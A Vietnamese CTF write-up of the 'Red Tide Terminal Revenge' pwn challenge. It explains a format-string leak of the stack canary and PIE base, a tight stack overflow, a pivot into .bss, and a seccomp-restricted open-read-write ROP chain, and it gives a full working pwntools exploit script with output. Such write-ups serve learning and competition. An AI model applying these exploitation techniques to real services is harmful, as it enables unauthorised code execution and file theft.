# Red Tide Terminal Revenge (Pwn)

## 1. Thông tin tổng quan
- **Category:** Pwn (Binary Exploitation)
- **Difficulty:** Hard
- **Tags:** Format String, Stack Overflow, Seccomp, ORW ROP, Stack Pivot, Tight ROP Budget

## 2. Đề bài
> *(Không lưu lại nguyên văn đề bài từ platform, mô tả dưới đây được viết lại dựa trên hành vi thực tế của chương trình.)*

Bản "khó hơn" của `red_tide_terminal`, cùng ý tưởng seccomp ORW nhưng chương trình yêu cầu nhập 2 trường ("Codename" và "Audit note") thay vì 1, và cửa sổ overflow bị thu hẹp đáng kể so với bản gốc. Cùng một `seccomp` filter chỉ cho phép `read`, `write`, `openat`, `exit`, `exit_group`.

Mục tiêu: lấy flag nằm trong `flag.txt`, chỉ bằng các syscall được seccomp cho phép.

**File đính kèm:**
- `red_tide_terminal_revenge` — ELF 64-bit, PIE, NX enabled, Full RELRO, Canary found, not stripped (có debug_info), có cài `seccomp` filter.

## 3. Quá trình phân tích

Cấu trúc lỗ hổng về bản chất giống hệt `red_tide_terminal`, nhưng bị siết chặt hơn ở cả hai điểm. `log_identity()` giờ đọc 2 trường bằng `fgets` — "Codename" và "Audit note" — rồi in ra `"AUDIT[%#lx]: "` với một giá trị con trỏ đã bị obfuscate (không hữu ích trực tiếp), sau đó `printf(audit_note)` — **format string bug** nằm ở trường nhập thứ hai thay vì thứ nhất. `route_packet()` vẫn overflow theo kiểu cũ (`read(0, buf, n)` chỉ check `n <= 0xb0`), nhưng khoảng cách buffer→return giờ chỉ còn `0x58` byte, để lại vỏn vẹn **11 qword** cho ROP chain — chật hơn hẳn bản gốc (vốn đã phải chia 2 tầng).

11 qword không đủ ngay cả cho chain tối giản "read + pivot" nếu làm theo cách thông thường (gọi `read` cần 8 qword gadget rồi mới tới `pop rbp; leave;ret` để pivot — vượt quá 11 qword). Điểm mấu chốt để "vừa túi" nằm ở việc tận dụng chính `leave; ret` của `route_packet` — vốn *đã* thực thi ở cuối hàm để trả về bình thường. `leave` tương đương `mov rsp, rbp; pop rbp`, tức là nó tự nạp `rbp` từ slot "saved rbp" đã bị overflow ghi đè. Nếu ta set sẵn `saved rbp = bss` **ngay trong chính payload tràn ban đầu** (không tốn thêm qword ROP nào, chỉ là ghi đè đúng vị trí có sẵn), thì `leave; ret` của `route_packet` tự làm luôn việc pivot `rbp` — chain ROP chỉ còn cần **10 qword** để gọi `read(0, bss, 0x200)` rồi tự `leave; ret` lần nữa để nhảy `rsp` sang `bss`, vừa khít trong 11 qword cho phép.

Sau khi pivot, chain ORW đầy đủ (giống hệt bản gốc: `openat("flag.txt")` → `read` → `write` → `exit_group`) được gửi ở lần `send` thứ hai, thực thi tại `.bss` không còn giới hạn kích thước.

**Hướng giải quyết:**
1. Gửi "Codename" bất kỳ (không quan trọng), gửi "Audit note" là chuỗi format-string leak canary (`%9$p`) và địa chỉ return trên stack (`%11$p`), suy ra `PIE base = ret_leak - offset_cố_định`.
2. Tính địa chỉ các gadget cần dùng (`pop rdi/rsi/rdx/rax; syscall`, `leave; ret`) và địa chỉ `.bss`.
3. Dựng payload tràn: `padding 0x48 byte + canary thật + saved-rbp bị ghi đè = bss + stage1 (10 qword)`, với `stage1` chỉ gồm `read(0, bss, 0x200)` rồi kết thúc bằng `leave; ret`.
4. Gửi payload này làm "Packet data" — khi `route_packet()` return, `leave;ret` của chính nó nạp `rbp = bss` (đã set sẵn từ bước 3) rồi nhảy vào `stage1`; `stage1` chạy `read` nạp thêm dữ liệu lớn vào `bss`, rồi `leave;ret` lần hai pivot hẳn `rsp` sang `bss`.
5. Gửi tiếp (lần `send` thứ hai) chain ORW đầy đủ đặt tại `bss`, kèm chuỗi `"flag.txt\0"` làm tham số path.
6. Sau pivot, CPU thực thi đúng chain ORW → đọc và in ra flag.

## 4. PoC

```python
#!/usr/bin/env python3
# Red Tide Terminal Revenge - GuCTF pwn  (seccomp ORW ROP, tighter)
#
# Same seccomp ORW setup as red_tide_terminal (read/write/openat/exit), but the
# overflow window is smaller:
#   log_identity(struct): fgets(struct,0x28); fgets(struct+0x28,0x28);
#       printf("AUDIT[%#lx]: ", *(struct+0x50));   <- leaks an obfuscated ptr
#       printf(struct+0x28);                        <- FORMAT STRING (2nd codename)
#   route_packet(): read(0, [rbp-0x50], n) with only n <= 0xb0 checked;
#       buffer -> return is 0x58, leaving just 11 qwords of ROP.
#
# Format string leaks canary (%9) and a PIE return addr (start_session+0x56, %11).
#
# 11 qwords is too small for a full ORW chain, so we stage into .bss and pivot.
# Trick to fit stage-1 in 11 qwords: pre-set the OVERWRITTEN saved rbp = bss, so
# route_packet's own `leave;ret` already loads rbp=bss. Stage-1 then only needs
#   read(0, bss, 0x200) ; leave;ret        (10 qwords)
# and the final leave;ret pivots rsp into bss to run the real ORW chain.
#
# REMOTE (per the GuCTF pattern) is a NON-PIE / no-canary / endbr64 rebuild; the
# absolute addresses were recovered via the fmt-string arbitrary read.

from pwn import *

context.binary = ELF('./red_tide_terminal_revenge', checksec=False)
context.log_level = 'info'

HOST, PORT = '10.112.0.12', 42461


def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    return process(context.binary.path)


def exploit():
    p = start()

    if args.REMOTE:
        # địa chỉ tuyệt đối cố định trên bản remote non-PIE (đã phục hồi qua
        # arbitrary-read dựng từ format string; mỗi gadget dạng endbr64;op;ret;nop;ud2).
        # Bản build này không có canary.
        p.sendlineafter(b'Codename:', b'AAAA')
        p.sendlineafter(b'Audit note:', b'stormpetrel')   # không có canary để leak
        canary = 0
        p_rdi, p_rsi, p_rdx, p_rax, syscall = 0x4013ec, 0x4013f5, 0x4013fe, 0x401407, 0x401410
        leave_r = 0x40141a               # leave ; ret
        bss     = 0x404100
    else:
        p.sendlineafter(b'Codename:', b'AAAA')
        p.sendlineafter(b'Audit note:', b'%9$p.%11$p')
        p.recvuntil(b'AUDIT[')
        p.recvuntil(b': ')
        canary_s, ret_s = p.recvline().strip().split(b'.')
        canary = int(canary_s, 16)
        pie    = int(ret_s, 16) - 0x1676
        log.success('canary   = %#x', canary)
        log.success('PIE base = %#x', pie)
        p_rdi, p_rsi, p_rdx, p_rax = pie + 0x13b0, pie + 0x13b5, pie + 0x13ba, pie + 0x13bf
        syscall = pie + 0x13c4
        leave_r = pie + 0x13ca
        bss     = pie + 0x4100

    # --- tầng 1: overflow route_packet; saved rbp được set sẵn = bss ---
    stage1 = flat(
        p_rax, 0, p_rdi, 0, p_rsi, bss, p_rdx, 0x200, syscall,  # read(0,bss,0x200)
        leave_r,        # mov rsp,bss ; pop rbp ; ret -> thực thi [bss+8]
    )
    payload = b'A' * 0x48 + p64(canary) + p64(bss) + stage1
    assert len(payload) <= 0xb0, len(payload)

    p.sendlineafter(b'Packet length:', str(len(payload)).encode())
    p.recvuntil(b'Packet data:')
    p.send(payload)

    # --- tầng 2: chain ORW đầy đủ đặt tại bss (thực thi từ bss+8) ---
    readbuf   = bss + 0x300
    chain_len = 32 * 8                       # openat/read/write/exit
    path_addr = bss + 8 + chain_len
    chain = flat(
        p_rax, 257, p_rdi, 0xffffffffffffff9c, p_rsi, path_addr, p_rdx, 0, syscall,  # openat
        p_rax, 0, p_rdi, 3, p_rsi, readbuf, p_rdx, 0x100, syscall,                   # read
        p_rax, 1, p_rdi, 1, p_rsi, readbuf, p_rdx, 0x100, syscall,                   # write
        p_rax, 231, p_rdi, 0, syscall,                                               # exit_group
    )
    assert len(chain) == chain_len
    stage2 = p64(0) + chain + b'flag.txt\x00'
    p.send(stage2)

    data = p.recvall(timeout=3)
    m = re.search(rb'grodno\{[^}]*\}', data)
    if m:
        log.success('FLAG: %s', m.group().decode())
    else:
        log.info('output:\n%s', data.decode(errors='ignore'))
    p.close()


if __name__ == '__main__':
    exploit()
```

**Output:**
```
[+] Starting local process '/home/caterpie/GuCTF/pwn/red_tide_terminal_revenge/red_tide_terminal_revenge': pid 5511
[+] canary   = 0x87a4f21efcb90c00
[+] PIE base = 0x5e9fe7419000
[+] Receiving all data: Done (272B)
[+] FLAG: grodno{fake_flag}
```

## 5. Flag
```
grodno{fake_flag}
```
*(Flag thật đã submit trực tiếp lúc thi qua service của BTC, không lưu lại; giá trị trên chỉ minh hoạ định dạng.)*
